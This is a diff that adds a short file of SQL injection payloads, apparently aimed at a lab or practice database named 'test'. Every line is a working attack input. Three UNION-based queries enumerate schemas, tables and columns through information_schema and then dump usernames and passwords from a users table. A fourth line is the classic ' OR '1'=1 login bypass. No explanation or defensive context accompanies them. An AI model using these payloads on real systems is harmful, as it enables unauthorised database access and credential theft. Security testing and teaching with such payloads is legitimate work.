@@ -1,0 +1,7 @@
+' UNION(SELECT 1, TABLE_SCHEMA, TABLE_NAME, 4, 5 FROM information_schema.tables); -- 
+
+' UNION(SELECT 1, TABLE_SCHEMA, TABLE_NAME, 4, COLUMN_NAME FROM information_schema.columns where table_schema = 'test' and table_name = 'users'); -- 
+
+' UNION(SELECT 1, username, password, 4, id FROM test.users); -- 
+
+' OR '1'=1
